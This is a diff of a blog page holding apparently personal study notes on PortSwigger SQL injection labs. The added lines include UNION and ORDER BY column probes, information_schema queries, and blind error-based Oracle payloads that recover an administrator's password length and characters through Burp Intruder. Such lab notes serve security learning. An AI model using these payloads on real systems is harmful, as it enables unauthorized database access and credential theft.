@@ -479,14 +479,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2023-03-06
+                    2023-03-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    114
+                    379
                 </div>
                 
 
@@ -512,9 +512,10 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h3 id="sqli">Sqli</h3>
-<ul>
-<li><p>SQL injection vulnerability in WHERE clause allowing retrieval of
-hidden data</p>
+<h4
+id="sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">SQL
+injection vulnerability in WHERE clause allowing retrieval of hidden
+data</h4>
 <ul>
 <li><p>Web应用程序可能会将用户输入的空格作为SQL查询字符串中的分隔符<img
 src="https://s2.loli.net/2023/03/06/brl8wskQR4COuHI.png"
@@ -522,10 +523,11 @@ alt="image-20230306054219801" /></p></li>
 <li><p>protocol error<img
 src="https://s2.loli.net/2023/03/06/wGTusUkSzpYOJax.png"
 alt="image-20230306054301457" /></p></li>
-</ul></li>
-<li><p>Retrieving hidden data</p></li>
-<li><p>Subverting application logic</p></li>
-<li><p>Retrieving data from other database tables</p>
+</ul>
+<h4 id="retrieving-hidden-data">Retrieving hidden data</h4>
+<h4 id="subverting-application-logic">Subverting application logic</h4>
+<h4 id="retrieving-data-from-other-database-tables">Retrieving data from
+other database tables</h4>
 <ul>
 <li><p>SQL injection UNION attacks</p>
 <ul>
@@ -538,10 +540,68 @@ query?</p></li>
 <li><p>Which columns returned from the original query are of a suitable
 data type to hold the results from the injected query?</p>
 <ul>
-<li><div class="sourceCode" id="cb1"><pre
-class="sourceCode sql"><code class="sourceCode sql"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">order</span> <span class="kw">by</span></span></code></pre></div></li>
+<li><p>```sql # 1 ' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3--</p>
+<p>#2 Since NULL is convertible to every commonly used data type ' UNION
+SELECT NULL-- ' UNION SELECT NULL,NULL-- ' UNION SELECT
+NULL,NULL,NULL--</p>
+<pre class="language-none"><code class="language-none">
+  - Retrieving multiple values within a single column [SQL injection cheat sheet](https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;sql-injection&#x2F;cheat-sheet).
+
+#### Examining the database
+
+- Listing the contents of the database(note database type:sql sever, mysql,oracle)
+
+  &#96;&#96;&#96;sql
+  SELECT * FROM information_schema.tables
+  SELECT * FROM information_schema.columns WHERE table_name &#x3D; &#39;Users&#39;</code></pre></li>
 </ul></li>
 </ul></li>
+</ul>
+<h4 id="blind-sql-injection-vulnerabilities">Blind SQL injection
+vulnerabilities</h4>
+<ul>
+<li><p>Time delay</p></li>
+<li><p><a
+target="_blank" rel="noopener" href="https://portswigger.net/burp/application-security-testing/oast">OAST</a>
+techniques.</p></li>
+<li><p>payload</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">xyz<span class="token string">' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '</span>Administrator<span class="token string">'), 1, 1) > '</span>m</code></pre></li>
+<li><p>Blind SQL injection with conditional responses<img
+src="https://s2.loli.net/2023/03/07/8wuVmbezWTv5iqL.png"
+alt="image-20230307191232729" /></p></li>
+<li><p>Inducing conditional responses by triggering SQL errors</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">xyz<span class="token string">' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE '</span>a<span class="token string">' END)='</span>a
+xyz<span class="token string">' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '</span>a<span class="token string">' END)='</span>a
+
+<span class="token comment"># oracle</span>
+<span class="token keyword">FROM</span> dual
+
+<span class="token comment"># lab</span>
+<span class="token string">'||(SELECT '')||'</span>
+
+<span class="token string">'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</span>
+
+<span class="token string">'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span>
+
+<span class="token string">'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span>
+
+<span class="token comment"># 密码位数 intruder 爆破</span>
+<span class="token string">'||(SELECT CASE WHEN LENGTH(password)>§20§ THEN to_char(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span><span class="token punctuation">;</span> <span class="token keyword">session</span><span class="token operator">=</span>xxr9ozKDTaL66Z8WkuPtFTULpgHzblFD
+
+<span class="token comment"># 密码内容 intruder爆破</span>
+<span class="token string">'||(SELECT CASE WHEN SUBSTR(password,1,1)='</span>a<span class="token string">' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span></code></pre>
+<ul>
+<li><p>密码位数<img
+src="https://s2.loli.net/2023/03/07/ScWFdYPGHou5kgV.png"
+alt="image-20230307212510344" /></p></li>
+<li><p>密码内容<img
+src="https://s2.loli.net/2023/03/08/6ukXwAaH89EpKjl.png"
+alt="image-20230308011829348" /><img
+src="https://s2.loli.net/2023/03/08/wUVglhPAnK1Syqo.png" /><img
+src="https://s2.loli.net/2023/03/08/nW8GR1pb97ru6do.png"
+alt="image-20230308012032743" /><img
+src="https://s2.loli.net/2023/03/08/8eQsWvpOnwdfVNz.png"
+alt="image-20230308012126649" /></p></li>
 </ul></li>
 </ul>
 
@@ -1153,7 +1213,7 @@ class="sourceCode sql"><code class="sourceCode sql"><span id="cb1-1"><a href="#c
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">59.7k</span>&nbsp;字
+                class="white-color">60.1k</span>&nbsp;字
             
             
             
